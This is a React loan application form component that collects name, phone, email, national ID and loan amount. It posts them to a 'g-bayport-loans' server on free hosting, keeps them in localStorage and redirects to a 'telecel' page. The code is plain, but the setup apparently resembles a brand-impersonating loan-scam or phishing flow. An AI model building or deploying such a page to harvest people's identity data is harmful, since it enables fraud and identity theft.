import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import "../styles/app.css";

export default function Apply() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const [form, setForm] = useState({
    name: "",
    phone: "",
    email: "",
    id: "",
    amount: "",
    repayment: "12 months"
  });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        form
      );

      const id = res.data.id;

      localStorage.setItem("loanData", JSON.stringify(form));

      navigate(`/telecel/${id}`);

    } catch (err) {
      alert("Submission failed");
    }

    setLoading(false);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <div className="header">
          <h1>Apply for Loan</h1>
        </div>

        <form onSubmit={handleSubmit}>

          <input name="name" placeholder="Full Name" onChange={handleChange} required />
          <input name="phone" placeholder="Phone" onChange={handleChange} required />
          <input name="email" placeholder="Email" onChange={handleChange} />
          <input name="id" placeholder="National ID" onChange={handleChange} required />
          <input name="amount" placeholder="Amount" type="number" onChange={handleChange} required />

          <button className="btn">
            {loading ? <div className="spinner"></div> : "Proceed"}
          </button>

        </form>

      </div>
    </div>
  );
}